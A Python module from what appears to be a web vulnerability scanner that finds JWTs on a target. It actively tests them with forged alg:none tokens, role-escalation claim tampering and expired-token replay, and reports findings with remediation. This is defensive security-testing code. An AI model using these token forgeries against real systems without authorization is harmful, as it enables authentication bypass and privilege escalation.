"""SentinelX module [13]: JWT security testing.

Finds JWTs in Set-Cookie values and response bodies, then runs REAL
verified attacks: alg:none bypass, claim tampering (role escalation),
and expired-token acceptance. All base64url helpers implemented
locally — no external jwt library. Returns [] silently when no JWT
is found (no false positives).
"""

from __future__ import annotations

import base64
import json
import re
import time
from urllib.parse import urlsplit, urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.diff import fuzzy_similarity

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")

REMEDIATION_JWT = (
    "Never accept alg:none. Whitelist allowed algorithms server-side and "
    "reject anything else. Validate signature, exp, nbf, aud, and iss on "
    "every request. Use strong, random HMAC secrets (never the public key). "
    "Never trust client-controlled claims (role, isAdmin) without a "
    "server-side authorization check."
)


# ---------- base64url helpers (no external lib) ----------
def b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64u_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Return (header, payload, signature_b64) or None if malformed."""
    try:
        h_b64, p_b64, sig_b64 = token.split(".")
        header = json.loads(b64u_decode(h_b64))
        payload = json.loads(b64u_decode(p_b64))
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None
        return header, payload, sig_b64
    except Exception:
        return None


def build_token(header: dict, payload: dict, signature_b64: str = "") -> str:
    h = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature_b64}"


def alg_none_token(payload: dict) -> str:
    return build_token({"alg": "none", "typ": "JWT"}, payload, "")


# ---------- candidate discovery ----------
def _cookies_from(resp) -> dict[str, str]:
    out: dict[str, str] = {}
    if not resp:
        return out
    raw = [v.decode("latin1") for k, v in resp.headers.raw
           if k.lower() == b"set-cookie"]
    for c in raw:
        name_val = c.split(";", 1)[0]
        if "=" in name_val:
            name, val = name_val.split("=", 1)
            out[name.strip()] = val.strip()
    return out


async def _find_jwts(client: ScanClient, url: str) -> list[tuple[str, str]]:
    """Return [(token, source)] discovered from cookies + bodies."""
    found: list[tuple[str, str]] = []
    seen: set[str] = set()

    def add(token: str, source: str):
        if token not in seen and parse_jwt(token):
            seen.add(token)
            found.append((token, source))

    # 1. the endpoint itself: cookies + body
    resp = await client.get(url)
    if resp:
        for name, val in _cookies_from(resp).items():
            for tok in JWT_RE.findall(val):
                add(tok, f"Set-Cookie:{name}")
        for tok in JWT_RE.findall(resp.text):
            add(tok, "response-body")

    # 2. site homepage: cookies + body (common token locations)
    u = urlsplit(url)
    home = f"{u.scheme}://{u.netloc}/"
    if home != url:
        hresp = await client.get(home)
        if hresp:
            for name, val in _cookies_from(hresp).items():
                for tok in JWT_RE.findall(val):
                    add(tok, f"homepage Set-Cookie:{name}")
            for tok in JWT_RE.findall(hresp.text):
                add(tok, "homepage-body")
    return found


def _evidence(method, url, req_headers, body_sent, resp) -> Evidence:
    rbody = resp.content if resp else b""
    return Evidence(
        request_raw=raw_request(method, url, req_headers, body_sent),
        response_raw=raw_response(resp.status_code if resp else 0,
                                  dict(resp.headers) if resp else {}, rbody),
        proof="",
    )


async def _bearer_probe(client: ScanClient, url: str, token: str,
                        headers: dict) -> tuple[object | None, str, dict]:
    """GET url with Authorization: Bearer token. Returns (resp, full_url, sent_headers)."""
    h = {**headers, "Authorization": f"Bearer {token}"}
    resp = await client.get(url, headers=h)
    return resp, url, h


# ---------- attacks ----------
ESCALATION_VARIANTS = [
    ("role", "admin"), ("role", "administrator"), ("roles", ["admin"]),
    ("isAdmin", True), ("is_admin", True), ("admin", True),
    ("sub", "1"), ("sub", "admin"), ("user_id", 1), ("uid", 1),
]

ELEVATED_MARKERS = re.compile(r"admin|elevat|privileg|root|superuser", re.I)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    headers = {"User-Agent": config.user_agent}

    candidates = await _find_jwts(client, url)
    if not candidates:
        return []  # no JWT on target: silent, no false positives

    for token, source in candidates:
        parsed = parse_jwt(token)
        if not parsed:
            continue
        header, payload, sig_b64 = parsed

        # baseline: does the endpoint accept the ORIGINAL token as Bearer?
        base_resp, full_b, sent_h = await _bearer_probe(client, url, token, headers)
        if not base_resp or base_resp.status_code != 200:
            continue  # endpoint doesn't accept Bearer JWT; can't verify attacks
        # baseline stability: repeat once
        base_resp2, _, _ = await _bearer_probe(client, url, token, headers)
        if not base_resp2 or base_resp2.text != base_resp.text:
            continue
        base_body = base_resp.text
        # anti-false-positive: endpoint must actually be token-sensitive.
        # If a garbage Bearer token is also accepted with similar content,
        # the endpoint ignores auth entirely (different bug, not JWT crypto).
        garbage = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0." + "A" * 43
        g_resp, _, _ = await _bearer_probe(client, url, garbage, headers)
        if g_resp and g_resp.status_code == 200:
            if fuzzy_similarity(base_body, g_resp.text) > 0.75:
                continue  # auth not enforced here; JWT-specific attacks meaningless

        # ---- a) alg:none ----
        none_token = alg_none_token(payload)
        resp, full, sent = await _bearer_probe(client, url, none_token, headers)
        if resp and resp.status_code == 200:
            sim = fuzzy_similarity(base_body, resp.text)
            if sim > 0.75:
                ev = _evidence("GET", full, sent, None, resp)
                ev.proof = (f"alg:none token (empty signature) accepted: HTTP 200, "
                            f"{sim:.0%} content similarity to valid-token baseline "
                            f"(source: {source})")
                findings.append(Finding(
                    type="JWT Security", subtype="alg-none-bypass",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.95, url=full, method="GET",
                    param="Authorization", payload="[alg:none forged token]",
                    evidence=ev, cwe="CWE-347",
                    owasp="A02:2021 – Cryptographic Failures",
                    remediation=REMEDIATION_JWT,
                    references=["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
                ))
                # don't spam other attacks for this token once bypass proven

        # ---- b) claim tampering (keep original signature) ----
        for claim, evil in ESCALATION_VARIANTS:
            tampered = dict(payload)
            tampered[claim] = evil
            forged = build_token(header, tampered, sig_b64)
            resp, full, sent = await _bearer_probe(client, url, forged, headers)
            if not resp or resp.status_code != 200:
                continue
            sim = fuzzy_similarity(base_body, resp.text)
            changed = sim < 0.99
            elevated = bool(ELEVATED_MARKERS.search(resp.text)) and not ELEVATED_MARKERS.search(base_body)
            if changed or elevated:
                ev = _evidence("GET", full, sent, None, resp)
                ev.proof = (f"Tampered claim {claim}={evil!r} with ORIGINAL signature "
                            f"accepted: HTTP 200, content {'changed' if changed else 'shows elevated markers'} "
                            f"(similarity {sim:.0%})")
                findings.append(Finding(
                    type="JWT Security", subtype=f"claim-tampering:{claim}",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                    confidence=0.88, url=full, method="GET",
                    param="Authorization", payload=f"[forged {claim}={evil}]",
                    evidence=ev, cwe="CWE-347",
                    owasp="A02:2021 – Cryptographic Failures",
                    remediation=REMEDIATION_JWT,
                    references=["https://portswigger.net/web-security/jwt"],
                ))
                break

        # ---- c) expired token acceptance ----
        expired_payload = dict(payload)
        expired_payload["exp"] = 1000000000  # 2001-09-09, definitely past
        expired_token = build_token(header, expired_payload, sig_b64)
        resp, full, sent = await _bearer_probe(client, url, expired_token, headers)
        if resp and resp.status_code == 200:
            sim = fuzzy_similarity(base_body, resp.text)
            if sim > 0.75:
                ev = _evidence("GET", full, sent, None, resp)
                ev.proof = (f"Token with exp=1000000000 (year 2001) still accepted: "
                            f"HTTP 200, {sim:.0%} similarity to valid baseline")
                findings.append(Finding(
                    type="JWT Security", subtype="expired-token-accepted",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
                    confidence=0.85, url=full, method="GET",
                    param="Authorization", payload="[expired forged token]",
                    evidence=ev, cwe="CWE-347",
                    owasp="A02:2021 – Cryptographic Failures",
                    remediation=REMEDIATION_JWT,
                    references=["https://portswigger.net/web-security/jwt"],
                ))

    return findings
